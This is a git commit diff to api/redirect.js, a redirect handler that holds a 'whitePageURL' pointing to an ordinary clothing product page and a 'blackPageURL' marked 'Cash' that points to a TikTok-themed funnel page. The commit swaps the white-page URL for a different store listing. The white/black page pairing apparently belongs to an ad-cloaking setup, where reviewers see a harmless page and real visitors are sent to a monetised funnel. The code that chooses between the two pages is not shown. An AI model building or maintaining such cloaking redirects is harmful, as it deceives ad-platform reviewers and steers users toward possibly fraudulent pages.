e85e0c5f6427a4fd8a9fcfdf6b8b1c8a03222fa9
s4-glitchy <s4alicreator001@gmail.com>
2025-02-12 03:18:10 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://xavemenmyshopifycom.creator-spring.com/listing/xaveman-clothing?product=636";
+    const whitePageURL = "https://original.pk/products/foggy-gray-fold-in-pocket-womens-winter-coat-packable-lightweight-full-zip-puffer-with-hood-quilted-amess-b0b27l869q";
     // Cash
     const blackPageURL = "https://YAbHewMyUM.myfunnelish.com/tiktok-vote123-second";
   
